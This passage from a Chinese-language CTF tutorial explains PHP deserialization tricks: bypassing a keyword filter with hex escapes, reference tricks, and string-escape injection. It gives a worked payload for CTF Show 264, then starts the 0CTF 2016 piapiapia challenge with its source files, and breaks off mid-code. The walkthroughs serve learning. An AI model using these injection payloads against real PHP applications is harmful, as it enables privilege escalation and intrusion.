class="variable">$username</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span>  <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> 666;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> check(<span class="variable">$data</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$data</span>, <span class="string">&#x27;username&#x27;</span>)!==False)&#123;</span><br><span class="line">        <span class="built_in">echo</span>(<span class="string">&quot;你绕不过！！&quot;</span>.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 未作处理前</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = check(<span class="variable">$a</span>);</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line">// 做处理后 \75是u的16进制</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = check(<span class="variable">$a</span>);</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h3 id="1-6-5-引用"><a href="#1-6-5-引用" class="headerlink" title="1.6.5 引用"></a>1.6.5 引用</h3><p>测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__contruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = &amp;<span class="keyword">$this</span>-&gt;a; <span class="comment">// $b 是 $a 的引用,从而使a 与 b 永远相等</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;a === <span class="keyword">$this</span>-&gt;b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = serialize(nre test());</span><br></pre></td></tr></table></figure><h1 id="二、反序列化字符串逃逸"><a href="#二、反序列化字符串逃逸" class="headerlink" title="二、反序列化字符串逃逸"></a>二、反序列化字符串逃逸</h1><p>概述：反序列化的字符串逃逸，包括字符增加与字符减少两类。</p><h2 id="2-1-知识一："><a href="#2-1-知识一：" class="headerlink" title="2.1 知识一："></a>2.1 知识一：</h2><ul><li>PHP 反序列化时，对类中不存在的属性也会反序列化；</li><li>PHP 反序列化时，底层代码是以 <code>;</code>作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的；即当存在 <code>;&#125;</code> 与 <code>&#123;</code>  匹配时，不会再对 <code>;&#125;</code> 后面的字符串进行反序列化。</li></ul><p> <strong>简单理解一下</strong></p><p><img src="https://i.loli.net/2021/06/12/wOtFRIT7QracXNJ.png" alt="image-20210612153444877"></p><p><img src="https://i.loli.net/2021/06/12/yp5auIfPciTKWe3.png" alt="image-20210612153557488"></p><p>我们在序列化之后的字符串 <code>;&#125;</code> 后再加上一些内容，其仍可被正常解析，说明在 PHP 反序列时碰到 <code>;&#125;</code> 与前面的 <code>&#123;</code> 配对之后，就会停止反序列化。</p><h2 id="2-2-知识二："><a href="#2-2-知识二：" class="headerlink" title="2.2 知识二："></a>2.2 知识二：</h2><ul><li>当进行反序列化的字符串中长度与所描述的长度不同时，就会 <strong>报错</strong></li></ul><h2 id="2-3-字符增多-—-CTF-Show-264"><a href="#2-3-字符增多-—-CTF-Show-264" class="headerlink" title="2.3 字符增多 — CTF Show 264"></a>2.3 字符增多 — CTF Show 264</h2><p><a href="https://ctf.show/challenges#web264-724">题目链接</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># message.php：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php:</span></span><br><span class="line">Your message has been sent <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><blockquote><ol><li>想要获取 flag，需要使 <code>$msg-&gt;token==&#39;admin&#39;</code> ，而默认 <code>public $token=&#39;user&#39;;</code></li><li>字符串逃逸：构造 以下内容</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span> = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure><blockquote><ol start="3"><li>更改 $to 的值</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span> = <span class="string">&#x27;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:28:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure><blockquote><ol start="4"><li>利用 <code>str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg))</code> 补充字符串长度；增加 27 个长度；</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span> = <span class="string">&#x27;cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:136:&quot;cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样被替换之后变成以下内容，正好补上 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:136:&quot;cloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=a&amp;m=b&amp;t=cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>然后我们抓包，更改 cookie 即可</p><p><img src="https://i.loli.net/2021/06/12/yedxVQwtYGucfm3.png" alt="image-20210612211255566"></p><h2 id="2-4-字符增多-—-0CTF-2016-piapiapia"><a href="#2-4-字符增多-—-0CTF-2016-piapiapia" class="headerlink" title="2.4 字符增多 — [0CTF 2016]piapiapia"></a>2.4 字符增多 — [0CTF 2016]piapiapia</h2><p><a href="https://buuoj.cn/challenges#[0CTF%202016]piapiapia">题目链接</a></p><p><strong>分析：</strong></p><blockquote><ol><li>目录扫描 ，得到 <a href="http://www.zip,查看源码/">www.zip，查看源码</a></li></ol></blockquote><p><img src="https://i.loli.net/2021/06/12/duJgi58ZpxNOwQk.png" alt="image-20210612213229646"></p><blockquote><ol start="2"><li>register.php ，注册一下</li><li>注册成功之后，将跳转 index.php，进行登录</li><li>成功登录，跳转到 update.php，填写详细信息，可进行文件上传</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$user-&gt;update_profile($username, serialize($profile));</code> 将填入的信息进行 序列化</p><blockquote><ol start="5"><li>它的上传文件的存储路径是 <code>$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code> ，起不到 <code>.php</code> 或者是 <code>图片木马包含的作用</code>;</li><li>代码审计</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># register.php</span></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$user</span>-&gt;is_exists(<span class="variable">$username</span>)) &#123;</span><br><span class="line"><span class="variable">$user</span>-&gt;register(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;User name Already Exists&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>注册成功，进入 index.php 进行下一步的登录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>登陆成功之后，进入 profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 